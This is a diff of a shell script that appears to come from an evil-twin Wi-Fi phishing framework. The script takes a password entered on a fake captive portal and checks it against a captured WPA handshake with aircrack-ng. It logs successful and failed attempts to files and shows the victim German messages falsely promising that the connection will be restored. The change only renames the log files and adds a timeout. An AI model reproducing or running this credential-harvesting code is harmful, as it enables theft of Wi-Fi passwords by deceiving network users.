@@ -20,17 +20,17 @@ password=${password//[*&\/?<>]}
 fi
 
 if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
-rm -rf "/tmp/www/ag.et_currentpass.txt" > /dev/null 2>&1
+rm -rf "/tmp/www/currentpass.txt" > /dev/null 2>&1
 echo "${password}" >\
-"/tmp/www/ag.et_currentpass.txt"
-aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/XXXXXX/XXXX.cap" | grep "KEY FOUND!" > /dev/null
+"/tmp/www/currentpass.txt"
+timeout 1.5 bash -c "aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w "/tmp/www/currentpass.txt" "/opt/wef/main/captures/XXXXXX/XXXX.cap" | grep "KEY FOUND!" > /dev/null"
 if [ "$?" = "0" ]; then
-touch "/tmp/www/ag.et_success.txt" > /dev/null 2>&1
+touch "/tmp/www/success.txt" > /dev/null 2>&1
 echo 'Das Passwort ist richtig, die Verbindung wird in kurzer Zeit wiederhergestellt'
 et_successful=1
 else
 echo "${password}" >>\
-"/tmp/www/ag.et_attempts.txt"
+"/tmp/www/attempts.txt"
 echo 'Das eingegebene Passwort ist falsch, Sie werden zur Homepage weitergeleitet'
 et_successful=0
 fi
